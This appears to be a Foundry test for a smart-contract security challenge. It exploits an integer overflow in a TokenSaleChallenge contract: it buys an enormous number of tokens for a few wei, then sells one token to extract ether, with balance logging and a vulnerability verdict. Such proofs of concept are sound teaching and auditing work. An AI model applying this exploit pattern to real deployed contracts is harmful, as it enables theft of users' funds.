// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/tokensalechallenge.sol";

contract TokenSaleTest is Test {
    TokenSaleChallenge tokenSale;
    address player = address(0x123);
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function setUp() public {
        // Deploy TokenSaleChallenge with 1 ether initial balance
        vm.deal(address(this), 1 ether);
        tokenSale = new TokenSaleChallenge{value: 1 ether}(player);
    }

    function testArithmeticOverflowAttack() public {
        // Player starts with some ether
        vm.deal(player, 2 ether);

        // Calculate the exact amount that will cause overflow
        // We want (numTokens * PRICE_PER_TOKEN) to overflow to a small value
        uint256 numTokens = type(uint256).max / PRICE_PER_TOKEN + 1;
        
        // This multiplication will overflow and result in a small value
        uint256 overflowValue;
        unchecked {
            overflowValue = numTokens * PRICE_PER_TOKEN;
        }

        console2.log("--- BEFORE-Trigger State ---");
        uint256 contractEtherBefore = address(tokenSale).balance;
        uint256 playerEtherBefore = player.balance;
        uint256 playerTokenBefore = tokenSale.balanceOf(player);
        console2.log("Contract ether before:  ", contractEtherBefore);
        console2.log("Player ether before:    ", playerEtherBefore);
        console2.log("Player token before:    ", playerTokenBefore);
        console2.log("Overflow value:         ", overflowValue);

        console2.log("--- Trigger Attack (Buy & Sell) ---");
        vm.startPrank(player);
        tokenSale.buy{value: overflowValue}(numTokens);

        // Verify player's token balance is large despite paying little
        uint256 playerBalance = tokenSale.balanceOf(player);
        assertEq(playerBalance, numTokens, "Player should have large token balance");

        // Player sells just 1 token to get back more ether than they paid
        tokenSale.sell(1);
        vm.stopPrank();

        console2.log("--- AFTER-Trigger State ---");
        uint256 contractEtherAfter = address(tokenSale).balance;
        uint256 playerEtherAfter = player.balance;
        uint256 playerTokenAfter = tokenSale.balanceOf(player);
        console2.log("Contract ether after:   ", contractEtherAfter);
        console2.log("Player ether after:     ", playerEtherAfter);
        console2.log("Player token after:     ", playerTokenAfter);

        // Calculate state changes
        int256 contractDelta = int256(contractEtherAfter) - int256(contractEtherBefore);
        int256 playerDelta = int256(playerEtherAfter) - int256(playerEtherBefore);
        console2.log("Contract ether delta:   ", contractDelta);
        console2.log("Player ether delta:     ", playerDelta);

        // Verify attack profitability
        bool profitable = playerEtherAfter > (2 ether - overflowValue);
        console2.log("Player profitability:   ", profitable ? "YES" : "NO");

        // Final vulnerability verdict
        bool vulnerabilityExploited = contractEtherAfter == overflowValue && 
                                      playerDelta > 0 && 
                                      profitable;

        if (vulnerabilityExploited) {
            console2.log("Vulnerability Exists: Arithmetic overflow allowed purchase of %s tokens for only %s wei, enabling profit extraction", numTokens, overflowValue);
        } else {
            console2.log("Vulnerability not Exist: State changes not match expected exploit pattern (Contract ended with %s wei, expected %s)", contractEtherAfter, overflowValue);
        }
    }
}